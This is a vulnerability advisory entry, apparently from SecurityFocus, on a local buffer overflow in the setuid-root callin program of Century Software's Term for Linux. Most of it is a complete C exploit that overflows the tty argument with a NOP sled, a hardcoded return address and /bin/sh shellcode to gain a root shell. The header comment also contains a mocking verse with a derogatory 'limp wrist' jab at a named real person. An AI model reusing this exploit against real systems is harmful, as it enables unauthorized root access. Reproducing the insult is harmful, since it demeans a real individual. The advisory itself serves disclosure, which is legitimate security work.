source: http://www.securityfocus.com/bid/4174/info

Term is a commercially available software package for Unix and Linux operating systems. It is distributed and maintained by Century Software.

Under some circumstances, it may be possible for a local user to execute arbitrary code. Term does not properly check bounds when receiving arguments via the tty option on the commandline. As a result, it is possible for a local user to execute the callin and callout programs of Term, and overwrite process memory. This could result in the overwriting of stack variables, including the return address. The callin and callout programs are by default installed setuid root.

/********************************************************/
/* ex-callin.c - Haiku Hacker <haiku@hushmail.com>	*/
/* Exploits the buffer overflow in Century Software's	*/
/* calling component of the Term program for Linux.	*/
/********************************************************/
/* Greets, love, and respect to:			*/
/* KF, Merc, Synapse, UPT old and new, Lance Spitzner,	*/
/* egami, comega, jericho, and most importantly sl1k	*/
/* for his guidance, coaching, and tutoring.		*/
/********************************************************/
/* RFP's Pants						*/
/* -----------						*/
/* Rain Forest Puppy					*/
/* Wears tight black pants to big cons			*/
/* Does he have limp wrist?				*/
/********************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* use this to specify the location of callin */
#define CINPATH "./callin"


int main(int argc, char **argv)
{
	/* Shellcode borrowed from Aleph1 */
	char shellcode[] =
		"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\xb0\xa4\xcd\x80"
		"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"
		"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
		"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
		"\xff\xff/bin/sh";

	char egg_string[300];
	int i;
	unsigned long offset = 0;

	if (argc > 1)
	{
		offset = atoi(argv[1]);
	}

	memcpy(egg_string, "tty", 3);

	for (i = 3; i < 95; i++)
		egg_string[i] = 'A';

	*(long *)(egg_string+95) = 0xbffff67c + offset; 

	for (i = 99; i < 300; i++)
		egg_string[i] = 0x90;

	strcpy(egg_string+(sizeof(egg_string)-strlen(shellcode)), shellcode);

	execl(CINPATH, "callin", egg_string, 0);
}